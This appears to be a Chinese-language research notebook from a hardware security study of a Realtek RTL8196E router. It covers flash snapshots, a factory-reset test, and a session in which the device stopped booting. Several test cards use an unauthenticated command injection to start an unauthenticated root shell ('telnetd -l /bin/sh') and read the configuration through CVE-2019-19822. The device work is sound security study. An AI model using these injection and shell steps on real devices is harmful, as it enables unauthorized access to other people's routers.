- **裝置時鐘被偽造的 NTP 改過兩次**（無 RTC，重開即失）。
- **`telnetd -l /bin/sh` 在 port 23 上跑著，沒有認證** —— 這是我開的，收工要拔電。
- `H601` **完全沒動**；`COMPCS` / `COMPDS` 的差異仍是 `0 / 343`（`P9-9` 尚未執行）。

## 下一場從哪裡開始

**`P9-9`（reset 按鈕）一項都沒做，而它是刻意留的。** 它會把 `COMPCS` 蓋回 `COMPDS`，
抹掉本場每一項站著的地面——而本場結束時的地面正好是一份很值錢的東西：
`DHCP_MTU_SIZE=0`、`UPNP_ENABLED=0`、`ALG_SIP_ENABLED=0` 三個被 W05 寫壞的欄位
**同時還在原地**，所以 reset 之後量它們有沒有變回 1500 / 1 / 1，是
`P8-19` 那條因果鏈的第三個獨立驗證，也是 `P9-9` 自己的預測。**兩件事一發解決。**

1. **`P9-9`**，而且前後各一份 `H601` 快照（`A3.24` 要求的）。
2. **`UPNP_ENABLED` / `ALG_SIP_ENABLED` 從第 2 站寫回 1**，那是 `P6-1`、`P8-7`、`P6-5`
   三列唯一的路——這個 build 的網頁介面沒有任何一頁可以設它們。
3. **路由注入**（DHCP opt 33 / 121 / 249）：要在網卡插 WAN 埠**之前**先讓 `udhcpc` 到期，
   或改用「先拔線再插線」逼它重新 DISCOVER。

# 2026-08-19（三）W07 收尾場次 —— 計畫，寫在插電之前

**這一則寫在裝置上電之前，而且它推翻了上一則「下一場從哪裡開始」的其中兩條。**
推翻的依據全部來自桌面：昨晚第 2 站留下的 `config-region-20260818-1927-pre.bin`
解出來的內容，以及 `/bin/reload` 與 `/bin/flash` 的字串。**一個 byte 都還沒動到裝置。**

今晚只有一個裝置目標：`P9-9`。登記簿 W07 是 56 / 58（`P4-6` 今天在桌面關掉），
剩 `P9-9` 與 `P5-2`，而 `P5-2` 是刻意不做的那一列。

## 一、上一則寫的「唯一的路」不成立，而正確的說法是相反的

上一則說：`UPNP_ENABLED` / `ALG_SIP_ENABLED` 從第 2 站寫回 1「是 `P6-1`、`P8-7`、
`P6-5` 三列唯一的路」。

**那三列在昨晚就已經以 `na`（dynamic）登記結案了。** `python3 tools/rtcase.py
todo --week W07` 今天只列 `P4-6`（今天關掉）、`P5-2`、`P9-9`。所以寫 flash 不是
W07 收尾的必要條件，它是加值 —— 而它要動的是 `A2.5` / `A2.6`，全 repo 唯一不可逆
的一節，而且 `PROGRESS.md` 自己記著那個 `FLW` 演練**沒有真的排練過**。

**今晚的決定（作者，寫在插電前）**：只有在 reset 之後連 `DHCP_MTU_SIZE` 都沒有
回到 1500 的情況下才寫 flash —— 那時它是修復不是加值。若 WAN 救回來了，
`UPNP` / `ALG_SIP` 留給 W08，連同 `FLW` 演練一起排。

## 二、`A3.24` 的 `H601` 快照量的是抹除區，而那是一個不可能失敗的對照組

`A3.24` 原本要求前後各一份 `H601` 快照，並且說那是「唯一不可以省的一步」。
它給的命令是 `--flash 0x3F0000 --length 0x1000`。

**`H601` 在 `0x006000`。** 三個來源同意：`runsheet.md` `A2.3.1` 的分區圖自己就是
這樣畫的、`notes/flash-layout.md` 第 134 行、以及公開 Realtek SDK `apmib.h` 的
`HW_SETTING_OFFSET 0x6000`。實際去讀 `flash-n150rt-console-1.bin`：

```text
00006000: 4836 3031 048e 0214 4d67 2e01 ec14 4d67  H601....Mg....Mg
003f0000: ffff ffff ffff ffff ffff ffff ffff ffff  ................

0x6000     4093 non-FF bytes of 4096
0x3F0000      0 non-FF bytes of 4096
```

所以那一版的「不可以省的一步」，比的是 `0xFF` 對 `0xFF`。**它會永遠回報
UNCHANGED，包括在 reset 真的把 `H601` 蓋掉的那個世界裡** —— 而 `P9-9` 的反證條件
就是「reset 之後 `H601` 的內容改變」。**一個不可能失敗的對照組，正好架在這一列
唯一真正在問的那一格上。**

同一份命令還帶 `--at-prompt`（第 2 站的狀態），而 `A3.24` 掛在第 3 站，
所以照文件順序根本執行不了。`check-runsheet.py` 今天加了一條機械規則
（一個步驟的**命令**若需要別站的裝置狀態，就要在前面明確把讀者送去那一站），
`tools/test-check-runsheet.sh` 35 → 38 個案例，其中一個證明 `A3.8` 那種
「回 A2.2 搶 bootloader」的合法繞路不會被誤殺。

**修法是引用不是重寫**：`A2.3` 的 64 KiB 從 `0x0` 開始，`H601` 本來就在裡面。
而「前」那一份**已經有七份**，`0x6000` 起 4 KiB 的 sha256 前 24 字元在
2026-08-16 到 2026-08-18 之間完全相同：

```text
flash-n150rt-console-1.bin           afc5e91d5c095dd19db761e6
flash-n150rt-console-2.bin           afc5e91d5c095dd19db761e6
config-region-20260817-0733.bin      afc5e91d5c095dd19db761e6
config-region-20260817-post.bin      afc5e91d5c095dd19db761e6
w06-S1-pre.bin                       afc5e91d5c095dd19db761e6
w06-S4-final.bin                     afc5e91d5c095dd19db761e6
config-region-20260818-1927-pre.bin  afc5e91d5c095dd19db761e6
```

**橫跨三天、五次上電、兩次 flash 寫入的穩定基準線**，比原本設計的一對前後快照強。

## 三、`COMPDS` 自己被寫壞了，所以 `P9-9` 的預測今天沒有鑑別力 —— 已改，freeze 一起改

把昨晚那份 64 KiB 的兩個區都用 `fwrecon compcs` 解出來，對 2026-08-16 的原始讀值：

| | `COMPDS`（出廠預設） | `COMPCS`（現行） |
|---|---|---|
| `DHCP_MTU_SIZE` | 1500 → **0** | 1500 → **0** |
| `UPNP_ENABLED` | 1 → **0** | 1 → **0** |
| `ALG_SIP_ENABLED` | 1 → **0** | 1 → **0** |
| `SSH_ENABLED` | 1 → **0** | 1 → **0** |
| 總計偏離 | **25 / 343** | 21 / 343 |
| `COMPDS` vs `COMPCS`（今天） | **0 / 343** | |

**W05 那一輪未認證、參數缺席的 POST 不只改了現行設定，它改了出廠預設。**

於是原預測「reset 會把 `COMPCS` 覆寫回 `COMPDS`」**今天已經成立**，按下去分不出
「reset 有作用」與「reset 什麼都沒做」。預測在 `test-cases.toml` 改過了，
`amended = "2026-08-19"` 與 `amend_reason` 寫在同一格，freeze 雜湊
`ef7ab66d…` → `ea8cf733…` 在同一個 commit。**改在按鈕之前、任何結果之前。**

新預測的依據是靜態讀出來的按鈕路徑：`/bin/reload`（昨晚 `ps` 裡 PID 291，活著）
輪詢 `/proc/load_default`，命中之後印 `Going to Reload Default` 並執行
`flash default-sw`；而 `/bin/flash` 自己的 usage 把兩件事分開寫 ——
`default` 是「write all flash parameters **from hard code**」，`reset` 才是
「reset current setting to default」。**按鈕走的是前者。**

**兩個答案都是結果**：回到 1500 / 1 / 1，`P8-19` 拿到第三個獨立驗證；
仍然是 0，那就是一發未認證 POST 把裝置推進一個**連原廠復原按鈕都出不來**的狀態。

## 四、今晚的順序，以及每一步為什麼在那個位置

| # | 站 | 做什麼 | 為什麼在這裡 |
|---|---|---|---|
| 1 | 桌面 | `make doctor` | 已跑，見第六節 |
| 2 | 第 2 站 | `A2.3` 64 KiB 快照（`-pre`）+ IoC 預檢 | 這是 `H601` 的「前」與 `COMPCS`/`COMPDS` 的「前」，一份檔案兩個用途。**IoC 基準是 0 / 343 不是 4 / 343** —— 昨晚那一格差點中止全場 |
| 3 | 第 3 站 | `make liveness` | **新工具的第一次實戰。** 一發未認證 `GET /config.dat` 就答出三個欄位現在是不是 0。這也是開放題 #73 的正面回答 |
| 4 | 第 3 站 | 命令注入起 `telnetd -l /bin/sh` | `A3.23` 的理由：崩潰之後要有地方站。今晚不是為了崩潰，是為了 `flash allhw` |
| 5 | 第 3 站 | `flash allhw` → 存檔（reset 前） | `H601` 的便宜第二來源，**同一次進站就答得出來**。不取代第 2 站的 `cmp` |
| 6 | 第 3 站 | **按 reset 按鈕** | `T-64`。按之前所有卡片寫完 |
| 7 | 第 3 站 | `make liveness` 再一次 + `flash allhw` 再一次 | 欄位回來了沒有；`H601` 動了沒有 |
| 8 | 第 3 站 | 網路卡改插 WAN 埠 + 假 DHCP server | **行為那一半。** 欄位讀到 1500 與「它真的送得出 DISCOVER」差一個 MTU 0 的教訓 |
| 9 | 第 2 站 | `A2.3` 再一份（`-post`） | `H601` 的權威逐 byte 比對，以及 reset 後的 `COMPCS`/`COMPDS` |
| 10 | 第 4 站 | `A4.1` 登記、`A4.2` | 收工 |

**第 8 步的決定寫在插電前**：作者選「要做」。理由是開放題 #73 的整個內容就是
「沒有任何量測會問這台還能不能路由」，而今晚是第一次有機會正面回答它。

## 五、進站前就成立的禁令，逐條抄在這裡

1. **`telnetd -l /bin/sh` 是一個沒有認證的 root shell。收工一定要斷電。**
   昨晚它在 port 23 上跑了一整晚。
2. **按 reset 之前，這一場所有的紀錄卡都要先寫完。** reset 之後，任何一張
   「等一下再補」的卡都失去了可以回頭驗證的環境。
3. **每一張卡片的反證欄不可以空白，而且引號 `「」` 之後要有「實際看到」那一半。**
   `tools/check-benchlog.py` 用 `rfind("」")` 判，句尾放引號會被擋。
   今晚的卡片從 **`T-64`** 開始編。
4. **不寫 flash，除非 reset 連 `DHCP_MTU_SIZE` 都沒救回來**（第一節的決定）。
5. **`formWsc` 仍然是 `HAZARDOUS`**，今晚沒有任何理由碰它。
6. **IoC 預檢的成功條件是 0 / 343，不是 4 / 343。** 那個數字自 W05 下午起就是 0，
   而 `runsheet.md` `A2.3.4` 的**範例值**是 4 —— 昨晚就是抄那個範例抄錯的。

## 六、插電之前已經做完、而且驗過的事

| 做了什麼 | 驗證 |
|---|---|
| `usbipd attach --wsl` 兩個裝置 | `1-1 10c4:ea60` 與 `2-4 0bda:8153` 都是 `Attached`；WSL 裡 `/dev/ttyUSB0` 可讀可寫、`enxfc19286184c9` 在 `ip -br link` 裡 |
| WSL VM keepalive | `wsl -d Ubuntu-24.04 -- sleep 7200` 掛著。第一次 attach 失敗就是因為 VM 沒在跑 |
| `make doctor` tier 3 | **6 ok、4 not applicable、0 to fix**。四個 n/a 全是「網卡還沒設位址、還沒有路由、裝置還沒上電」 |
| `make doctor` 的新一節 | 「tier 3 — the device can still do its job」現在存在，而且在裝置沒上電時回報 `--`（沒有量到東西），不是 ok 也不是 FAIL |
| 桌面側 W07 收尾 | `P4-6` 已登記（static，`reports/cve-endpoints-unit-2018.json`）；開放題 #72 的儀器修好並重跑；開放題 #73 的儀器建好 |
| 14 個 guard suite | 全綠，含新的 `liveness-test`（19 例）與擴充後的 `runsheet-test`（38 例） |
| 登記簿 | `rtcase check` green，freeze `ea8cf733…`，W07 56 / 58 |

**網卡留在 WSL 裡不是方便問題。** 它若留在 Windows 側，Windows 會從這台拿到 DHCP
位址，測試會看起來正常而唯一的破綻是 `ttl=63` 不是 64 —— 儀器 bug 21。
今晚第 8 步要把網卡改插 WAN 埠，那條規則在那一步同樣成立。


## 更正一：這一場的標題日期寫錯了，而同一個錯在上一場的三張卡上更嚴重

**本檔只追加，所以上面那個標題留在原地，更正寫在這裡。**

上面那則計畫的標題寫「2026-08-19（三）」。**它是 2026-08-18（二）晚上寫的**，
23:09 commit（`b88b932`），而系統時鐘在寫這一段的此刻是 `2026-08-18 23:41 CST`。
所以那個標題是一個還沒到的日期。

查的時候發現同一個錯在上一場，而且那裡它更貴：

| 證據 | 時間 |
|---|---|
| `git log` `2ece97d`（進站實錄那一則） | **2026-08-18 21:55:39 +0800** |
| `git log` `8a881e4`（推理那一半） | **2026-08-18 22:04:13 +0800** |
| `dumps/p8-19-wan3.pcap` | **2026-08-18 21:35** |
| `dumps/p8-19-routes.pcap`（本場最後一個 capture） | **2026-08-18 21:39** |
| 但 `T-61` 卡片header 寫 | `2026-08-19 00:1x` |
| `T-62` 寫 | `2026-08-19 00:4x–02:1x` |
| `T-63` 寫 | `2026-08-19 02:2x` |

**三張卡片的時間，在它們被 commit 的時候還沒有發生。** `T-62` 說它在
`00:4x–02:1x` 之間做的那一輪 WAN 量測，它自己引用的 pcap 檔案時間是 21:35。

這件事重要，是因為**這個檔案全部的權威來自「當時、實際、逐字」**。一張時間是
編的的卡片，跟一張內容是編的的卡片，讀者沒有辦法分開 —— 而分不開的時候，
理性的讀者兩張都不信。三張卡的**內容**沒有問題（pcap、console log、`ps` 輸出
都在 `$FWRE_WORK/dumps/` 而且時間對得起來），錯的只有 header 上那個時間。

**不改原文，理由是本檔只追加。** 讀那三張卡的人請把 header 的時間讀成
「2026-08-18 21:2x–21:4x，實際時間見它們引用的檔案」。

`tools/check-benchlog.py` 檢查 header 上**有沒有**時間，不檢查那個時間是不是
可能的 —— 而它其實檢查得了：卡片時間不該晚於這個檔案被 commit 的時間。
記成開放題。

## 更正二：`P4-6` 的登記日期，與 `P9-9` 的 `amended` 欄

同一個原因，兩個地方寫了 `2026-08-19`：

- `reports/test-results.json` 的 `P4-6` 結果 → **重新登記一次 `--date 2026-08-18`**。
  `rtcase record` 是追加的、`latest_results` 取最後一筆，所以這是這支工具本來就
  設計好的路，登記簿會顯示跑了兩次。第一筆留在原地。
- `test-cases.toml` 的 `P9-9` `amended` / `amend_reason` → 改成 `2026-08-18`。
  那不在 freeze 的雜湊裡（freeze 只涵蓋 `id` / `predict` / `refute`），
  而把一個錯的日期改成對的日期不是移動球門。

---

# 2026-08-18（二）W07 收尾場次 —— 實錄，寫在跑完之後

**這一場沒有跑完，而停下來的方式是裝置不再開機。** 下面是實際打了什麼、
實際看到什麼，照順序。

```text
T-64  —      第 2 站：A2.3 快照、IoC 預檢、H601 基準線      2026-08-18 23:12–23:14
可行性: ★★★★★   驗證狀態(測前): —   依據: A2.3 · P9-9 的前半
送出（逐字）: console-dump.py catch --port /dev/ttyUSB0 --window 300 -v
              然後 console-dump.py dump --at-prompt --flash 0x0 --length 0x10000
                       --ram 0x81000000 --chunk 16384 -o …/config-region-20260819-w07close-pre.bin
原始回應:
      ok    <RealTek> - the boot loader is ours
            ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
      ok    control matched: 0b f0 00 04
      ok    65536 bytes -> …/config-region-20260819-w07close-pre.bin
      ok    sha256  67fb5858c479160d41336c10a543268aa85a8c29d17056c9895364a3163d777e
      ok    4 chunks, 0 needed a re-read, 2.0 min
      H601 (0x006000, 4096 bytes) sha256 前 24 字元:
        flash-n150rt-console-1.bin           afc5e91d5c095dd19db761e6
        config-region-20260818-1927-pre.bin  afc5e91d5c095dd19db761e6
        config-region-20260819-w07close-pre.bin afc5e91d5c095dd19db761e6
      IoC 預檢  COMPCS vs COMPDS : 0 / 343 differ
      DHCP_MTU_SIZE  COMPDS='0'  COMPCS='0'
      UPNP_ENABLED   COMPDS='0'  COMPCS='0'
      ALG_SIP_ENABLED COMPDS='0' COMPCS='0'
判定: ✅ 三個前提全部成立
反證檢查: 測前寫「H601 在兩份快照之間改變 → 停下來，先弄清楚為什麼，不要按任何按鈕」，
          實際七份快照（2026-08-16 到今天）的 0x6000 那 4 KiB **byte 完全相同**，
          沒有觸發；而 IoC 的成功條件 0 / 343 也對上了（不是作業單範例裡那個 4）
這一步燒掉了什麼: 一次上電
驗證狀態(測後): dynamic   下一步: 第 3 站
★ **檔名裡的 `20260819` 是錯的**，那是上面那個日期錯誤留下的。檔案本身沒問題，
  重新命名會讓 sha 與這張卡對不上，所以留著，並在這裡說明。
```

```text
T-65  —      make liveness 的第一次實戰（開放題 #73）        2026-08-18 23:18
可行性: ★★★★★   驗證狀態(測前): —   依據: tools/device-liveness.py（今天寫的）
送出（逐字）: 一發未認證 GET /config.dat，沒有憑證、沒有 shell
原始回應:
      device-liveness: http://10.1.1.1/config.dat -> 7510 bytes, 343 named fields
        FAIL  DHCP_MTU_SIZE    expected 1500         got 0
        ok    WAN_DHCP         expected 1            got 1
        ok    OP_MODE          expected 0            got 0
        ok    IP_ADDR          expected 10.1.1.1     got 10.1.1.1
        ok    USER_PASSWORD    expected <non-empty>  got <set>
        20 field(s) differ from the frozen baseline
        11 field(s) not compared (redacted here, in the clear in the baseline)
        verdict: BROKEN
判定: ✅ 成立
反證檢查: 測前寫「工具在一台已知壞掉的機器上回報 OK → 那它在任何機器上都回報 OK，
          整支收掉重寫」，實際它回報 BROKEN 並指名 DHCP_MTU_SIZE，
          沒有觸發。負面條件也成立：裝置沒上電時它回 exit 3（沒有量到東西），
          不是 ok 也不是 FAIL
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: 無
★ **這是開放題 #73 的正面回答。** 四場進站沒有一場注意到 WAN 從 2026-08-17 就斷了；
  這一發花 0.02 秒、不需要憑證、不需要 shell，而且它自己說出壞的是哪一格、壞了會怎樣。
```

```text
T-66  —      USER_PASSWORD 的殘留 byte，與兩條讀取路徑不一致  2026-08-18 23:14–23:20
可行性: ★★★★   驗證狀態(測前): unverified   依據: 找別的東西時撞到的
送出（逐字）: 把 T-64 那份快照的 COMPCS/COMPDS 與 2026-08-18 19:28 那份逐 entry
              比較，包含 raw bytes 而不只是解碼後的值
原始回應:
      COMPCS: 1 of 343 entries differ when RAW bytes are compared too
      COMPDS: 1 of 343 entries differ when RAW bytes are compared too
        id=183 name='USER_PASSWORD'
          08-18 19:28 raw=61646d696e00000000000000000000000000000000000000000000000000
          08-18 23:14 raw=61646d696e00660000000000000000000000000000000000000000000000
      header comp_len: 7498 -> 7501（兩個區都是）
      而 HTTP 取回的同一格：
          raw=61646d696e0000000000000000000000000000000000000000000000000000
          header comp_len = 7498
      序列埠讀到的 7510 bytes 與 HTTP 取回的 7510 bytes：7009 個 byte 不同
判定: 🔶 部分 —— 機制成立，兩條路徑為什麼不一致沒有答完
反證檢查: 測前寫「兩條獨立路徑讀到同一份 bytes → 那 A3.6 那條鏈成立，
          而殘留是真的」，**實際兩條路徑不一致**，觸發了，所以這一格只能記成
          部分：殘留在序列埠那條路上是確定的（同一份 dump 裡兩個區都有、
          comp_len 跟著長 3、chunk 重讀驗證過、解碼 checksum 通過），
          而它在 HTTP 那份裡不存在
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: 要回第 2 站再讀一次 0xC000 才分得出
          「開機會重寫 COMPCS」與「/config.dat 不是 flash 的逐 byte 複本」——
          **而那一步沒有做成，因為裝置在那之前就不再開機了**
🔴 **機制本身是一個新的缺陷。** `0x66` 是 `'f'`，位在 C 字串結束符之後第一個 byte。
  上一場 `P8-4` 把管理密碼改成一個暫時值再還原，**還原那一次寫入沒有把欄位清乾淨**，
  前一個較長密碼的第 7 個字元留在 flash 裡。C 字串仍然是 `admin`，所以
  **任何比較「解碼後的值」的工具都看不見它** —— 我自己第一輪跑出來的
  「0 / 343 differ」就沒看見，是比 `raw` 才出來的。
  配合未認證的 `GET /config.dat`（CVE-2019-19822），那是**一個已經被換掉的密碼的
  部分明文，仍然讀得到**。
🔴 **同一個殘留同時出現在 `COMPDS` 裡。** 那是「密碼寫入會同時寫出廠預設區」的
  直接證人，一個 byte。
⚠️ **暫時密碼的值不寫進本檔**，照 `docs/disclosure.md`。這裡記的是機制與位置。
```

```text
T-67  —      裝置停止回應，而且此後不再開機                  2026-08-18 23:2x
可行性: —      驗證狀態(測前): —   依據: —
送出（逐字）: 先用 A3.23 的命令注入把 telnetd 起來（POST formSysCmd -> 302，
              port 23 由 closed 變 OPEN），在那個 shell 上跑過
                cat /proc/mtd · cat /proc/uptime · ls -l /web/config.dat
                · grep -i documentroot /var/boa.conf      —— 四個都正常回應
              然後送出下面八個，一次連線：
                dd if=/dev/mtdblock0 bs=1 skip=49152 count=24 2>/dev/null | od -An -tx1
                dd if=/dev/mtdblock0 bs=1 skip=32768 count=24 2>/dev/null | od -An -tx1
                head -c 24 /web/config.dat | od -An -tx1
                dd if=/dev/mtdblock0 bs=1 skip=49152 count=7510 2>/dev/null | md5sum
                md5sum /web/config.dat
                flash get DHCP_MTU_SIZE
                flash get UPNP_ENABLED
                flash get ALG_SIP_ENABLED
原始回應:
      八個命令全部回空。之後：
        telnet 23        -> No route to host
        curl http://10.1.1.1/ -> 000
        ping             -> 100% packet loss
        ip neigh 10.1.1.1 -> FAILED，之後 INCOMPLETE
        序列埠 12 秒     -> 0 bytes
      斷電重開之後（三次，其中兩次全程 catch 在送 ESC）：
        序列埠 90 秒     -> 0 bytes
        序列埠 120 秒    -> 0 bytes
        ARP              -> INCOMPLETE
        HTTP             -> 000
      作者目視：**前面三顆燈同時亮、不閃，而那個狀態跟正常開機與 bootloader 都不一樣**
判定: ⚠️ 裝置在本場之後不再開機
反證檢查: 測前沒有為這一步寫條件 —— **它不是一個測試，它是一個意外**，
          而本檔記的是實際發生的事。事後能檢驗的那一條是：
          「板子還在執行，只是網路與 console 各自壞掉」→ 那要求兩個獨立的
          子系統同時失效，而 **完整斷電重開之後 bootloader 一個字都不印**
          否證了它：bootloader 的 banner 不經過 Linux、不經過網路
這一步燒掉了什麼: **裝置本身，狀態未知**
驗證狀態(測後): dynamic   下一步: 見下面「這一場燒掉了什麼」
🔴 **最可能是我造成的，而我沒有辦法指認是八個命令裡的哪一個。**
  最強的嫌疑是 `dd if=/dev/mtdblock0 bs=1 … count=7510`：那是對原始 MTD 區塊裝置
  做 57,000 次單 byte 讀，而那顆 SPI flash 同時是 bootloader 與 kernel 的來源。
  **但那是假設不是量測**，而且這一段的其他七個命令都還沒有被排除。
🔴 **今晚沒有任何一個命令寫過 flash。** 第 2 站的 `FLR`/`DB` 是讀；`dd` 是讀；
  `flash get` 是讀；命令注入寫的 `/var/web/` 是 ramfs。所以
  **「把 flash 燒壞了」不是預期的結果** —— 但「不是預期」不等於「沒發生」，
  而我現在沒有第二個儀器可以去看那顆 flash。
🔴 **這件事本身回答了一個沒有人問過的問題：這台的 reset 按鈕救不了這個狀態。**
  按鈕是 GPIO，由 `/bin/reload` 這個**使用者空間 daemon** 輪詢 `/proc/load_default`
  才生效（今天下午從 `/bin/reload` 與 `ps` 讀出來的）。**Linux 沒起來，就沒有人
  在讀那個按鈕。** 這台的原廠重置是軟體功能不是硬體功能，而那是一個
  「照著使用手冊做也救不回來」的形狀。作者在現場問了「要不要按 reset」，
  答案是不要——不只是因為它會毀掉 `P9-9`，更因為**它不會有任何作用**。
```

## 這一場燒掉了什麼

- **開機循環 4 次**：第 2 站 1 次、第 3 站 1 次、之後兩次嘗試恢復（都沒有成功）。
- **`telnetd -l /bin/sh` 起過一次**，沒有認證。裝置現在沒電，所以它不在了。
- **`/var/web/` 下寫了幾個空檔案**（ramfs，不存在了）。
- **裝置本身**：狀態未知，三顆燈同時亮，序列埠與網路都沒有回應。
- `H601` **完全沒動**（進站時量過，七份快照一致）。
- **`COMPCS` / `COMPDS` 的差異仍是 `0 / 343`**，`P9-9` **沒有執行**。

## 下一場從哪裡開始

**先講清楚 W07 的狀態**：登記簿 **56 / 58**。`P4-6` 今天在桌面關掉了；
`P5-2` 是刻意不做的那一列；**`P9-9` 沒有量到，而且短期內量不到**。
W07 收尾的時候要照這個寫，不要寫成「幾乎完成」。

1. **實體層，依序，而且都不需要花錢**：
   - 把 CP2102 從板子排針上**整個拔掉**，只留電源上電。USB 轉序列埠的 TX 腳
     會經由板子 RX 腳的 ESD 二極體倒灌，這是這類板子「接了 UART 就不開機」
     的經典症狀，而作業單裡「pin 1 的 VCC 不要接」那條規則是同一個問題的一半。
   - 換一顆電源變壓器，或把圓孔插頭重插到底。**三顆燈同時亮而且不動，
     也是電流不足的長相**：SoC 起不來、GPIO 沒有被接管、燈停在上電預設值。
   - 網路線也拔掉，只留電源。
2. **如果都沒有用，那條路要花錢，而 `docs/lab-inventory.md` 早就寫好了**：
   Pico + SOIC-8 夾（約 US$10），`P9-5` / `P9-6` / `P9-7` / `P9-11` 四項本來就
   卡在這一件事上。這個 repo 手上有**兩份互相驗證過的完整 4 MiB dump**
   （sha `a800059a…`，2026-08-14 與 2026-08-16 各一份），所以「讀出來比對、
   不一樣就寫回去」這條路是完整的 —— **缺的只有那個夾子。**
   `docs/lab-inventory.md` 說「Pico + serprog」而不是 CH341A，理由是
   **常見的黑色 CH341A 板子會在 3.3 V 的資料線上打 5 V**，而這台只有一個。
3. **不要按 reset。** 理由在 `T-67` 的第三個 🔴：這台的 reset 是使用者空間
   daemon 在輪詢 GPIO，Linux 沒起來就沒有人讀它。按下去不會有事，也不會有用，
   但它會讓之後任何 `P9-9` 的結果多一個解釋不掉的變數。


# 2026-08-19（三）W07 收尾場次 —— 實錄，後半（跨過午夜）

**上面那一則停在「裝置不再開機」。它回來了，而且回來的方式本身是一個量測。**

```text
T-68  —      裝置為什麼不開機：三個實體測試，第一個就中           2026-08-19 00:0x
可行性: ★★★★★   驗證狀態(測前): —   依據: T-67
送出（逐字）: 依序三個，每一個之後都從網路量：
              1. 把 CP2102 從板子排針上整個拔掉，只留電源，上電
              2.（沒有做到）換電源變壓器
              3.（沒有做到）連網路線也拔掉
原始回應:
      測試 1 之後：
        ping 10.1.1.1   -> 0% packet loss
        GET /           -> 200
        make liveness   -> 7510 bytes, DHCP_MTU_SIZE=0, 20 fields drifted, verdict BROKEN
判定: ✅ 第一個測試就成立
反證檢查: 測前寫「三個都做完還是不開機 → 那不是外部連接的問題，
          要靠離線讀 flash 才分得出，而這個 repo 沒有燒錄器」，
          實際第一個測試就把它救回來了，沒有觸發
這一步燒掉了什麼: 一次上電
驗證狀態(測後): dynamic   下一步: 無
🔴 **UART 轉接器接在排針上會讓這塊板子起不來，而這是量到的不是推的。**
   USB 轉序列埠的 TX 腳在板子沒電或剛上電時，會經由板子 RX 腳的 ESD 二極體倒灌。
   作業單裡「pin 1 的 `VCC` 不要接」那條規則是同一個問題的一半，而另一半沒有人寫下來。
   **這件事會讓一整場進站看起來像磚頭。** 今晚它讓三次斷電重開全部量到零。
★ 而它也解釋了為什麼前兩場都沒有踩到：那兩場沒有為了拔插電源反覆搬動機殼，
  三根杜邦線（特別是 GND）沒有被帶鬆。
```

```text
T-69  P9-9   Reset 按鈕：全場最後一發，而預測在按下去之前凍結    2026-08-19 00:0x
可行性: ★★★★★   驗證狀態(測前): static   依據: /bin/reload · /bin/flash 的 usage
送出（逐字）: 作者按下機殼上的 reset 鍵。**沒有從網路做**——網路那兩條路
              （`echo 1 > /proc/load_default`、直接跑 `flash default-sw`）
              是嚴格較弱的版本，留做備案
原始回應（reset 前，一發未認證 GET /config.dat）:
      7510 bytes · DHCP_MTU_SIZE=0 · UPNP_ENABLED=0 · ALG_SIP_ENABLED=0 · SSH_ENABLED=0
      20 / 343 個具名欄位偏離 2026-08-16 基準線 · verdict BROKEN
原始回應（reset 後）:
      7490 bytes
      sha256 e09cbf8428aa15944ed75939e79820c5ceff62990ebdfc65
      2026-08-16 flash dump 的 0xC000 起 7490 bytes：**同一個 sha256，逐 byte 相同**
      0 / 343 個具名欄位偏離 · verdict OK
      DHCP_MTU_SIZE=1500 · UPNP_ENABLED=1 · ALG_SIP_ENABLED=1 · SSH_ENABLED=1
      USER_PASSWORD 的殘留 byte（T-66）：沒有了
      ifconfig eth1 -> MTU:1500（reset 前兩天都是 MTU:0）
判定: ✅ 成立，三段全對
反證檢查: 反證（a）測前寫「reset 之後那三個欄位仍然是 0 → 按鈕的復原來源是
          flash 上的 DEFAULT_SETTING 區，而那個區是本專案自己寫壞的，
          那時 P8-19 要升級成『跨越原廠重置』」，**實際三個欄位全部回來**，沒有觸發。
          反證（b）測前寫「reset 之後 H601 的內容改變 → 出廠區的範圍判斷錯了」，
          實際見 T-70，沒有觸發
這一步燒掉了什麼: **這一場之前每一項站著的地面**——設定區被覆寫回出廠值，
          `P0-5` 的 IoC 基準歸零（本來就是 0 / 343，所以這一次沒有損失），
          `T-66` 那個密碼殘留的現場被抹掉（證據已經在快照裡）
驗證狀態(測後): dynamic   下一步: `H601` 的逐 byte 比對還缺第 2 站那一份
🔴 **`COMPDS` 自己是壞的，而按鈕還是把機器救回來了。** 那是這一列真正的答案：
   按鈕寫的是**編譯進去的硬編碼表**，不是 flash 上那塊出廠預設區。所以
   「未認證的 POST 把出廠預設區也寫壞了」這件事，**沒有**讓裝置失去復原能力。
   靜態那一半在按下去之前就寫下來了：`/bin/reload` 輪詢 `/proc/load_default`
   然後跑 `flash default-sw`，而 `/bin/flash` 的 usage 把
   「default -- write all flash parameters **from hard code**」和
   「reset -- reset current setting to default」分成兩個命令。
🔴 **原本的預測今天不可測，而那是在按之前發現的。** 「reset 會把 COMPCS 覆寫回
   COMPDS」——兩個區今天差 0 / 343，所以按下去分不出「有作用」與「沒作用」。
   預測改了、`amend_reason` 寫了、freeze 從 `ef7ab66d…` 改成 `ea8cf733…`，
   而那個 commit（`b88b932`）在按鈕之前。**這是這一整週唯一一次
   「先改預測、再按不可逆的按鈕」，而順序在 git 裡看得見。**
★ `P6-1`、`P8-7`、`P6-5` 三列同時解鎖，而且**完全不需要動 `A2.5`/`A2.6`**——
  進站前的計畫說那是「唯一的路」，結果那條路根本不必走。
```

```text
T-70  P9-9   H601 的第二個來源，同一次進站就答得出來             2026-08-19 00:0x
可行性: ★★★★   驗證狀態(測前): —   依據: /bin/flash 的 allhw 子命令
送出（逐字）: 命令注入起 telnetd（reset 重開機把上一個殺掉了），然後 `flash allhw`
原始回應（per-unit 識別碼照 docs/disclosure.md 不逐字抄，這裡記結構）:
      HW_BOARD_VER=2
      HW_NIC0_ADDR / HW_NIC1_ADDR / HW_HW_WLAN0_WLAN_ADDR / WLAN_ADDR1..7  全部有值
      HW_WLAN0_TX_POWER_CCK_A        = 2b2b2b2b29292929292727272727
      HW_WLAN0_TX_POWER_HT40_1S_A    = 2f2f2f2f2d2d2d2d2d2c2c2c2c2c
      HW_WLAN0_TX_POWER_DIFF_HT40_2S / DIFF_HT20 / DIFF_OFDM  全部有值
      HW_WLAN0_REG_DOMAIN=1 · HW_WLAN0_RF_TYPE=10 · HW_WLAN0_LED_TYPE=7
      HW_NIC0_ADDR 與線上 ARP 回應的 MAC、與 flash 0x006000 起的原始 bytes 三者一致
判定: ✅ H601 UNCHANGED（解碼層）
